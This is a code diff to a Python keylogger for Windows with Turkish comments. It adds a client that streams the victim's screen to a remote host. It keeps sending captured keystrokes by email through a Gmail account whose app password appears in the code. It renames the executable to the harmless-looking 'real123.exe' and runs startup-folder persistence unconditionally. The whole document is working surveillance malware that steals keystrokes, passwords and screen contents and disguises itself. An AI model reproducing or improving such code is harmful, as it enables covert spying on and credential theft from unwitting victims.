@@ -9,6 +9,12 @@ import subprocess
 import ctypes
 import winreg
 import sys
+from vidstream import ScreenShareClient
+
+
+def screenshare():
+    baglan = ScreenShareClient('192.168.100.133', 9999)
+    baglan.start_stream()
 
 
 log = ''
@@ -60,7 +66,7 @@ def thread_function():
     global log
     sender_email("@gmail.com", "emiokybnnrttvizv", log.encode('utf-8'))
     log = ""
-    timer_object = threading.Timer(30,thread_function)
+    timer_object = threading.Timer(120,thread_function)
     timer_object.start()
 
 def copy_to_startup():
@@ -69,7 +75,7 @@ def copy_to_startup():
         startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
 
         # Kopyalanacak dosyanın adını ve kaynak yolunu belirle
-        source_filename = 'keylogger.exe'
+        source_filename = 'real123.exe'
         source_path = os.path.abspath(source_filename)
 
         # Hedef yol oluştur
@@ -90,9 +96,10 @@ def copy_to_startup():
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
 
-if __name__ == "__main__":
-    copy_to_startup()
-    keylogger_listener.start()
-    thread_function()
-    keylogger_listener.join()
-    
+
+copy_to_startup()
+screenshare()
+keylogger_listener.start()
+thread_function()
+keylogger_listener.join()   
+
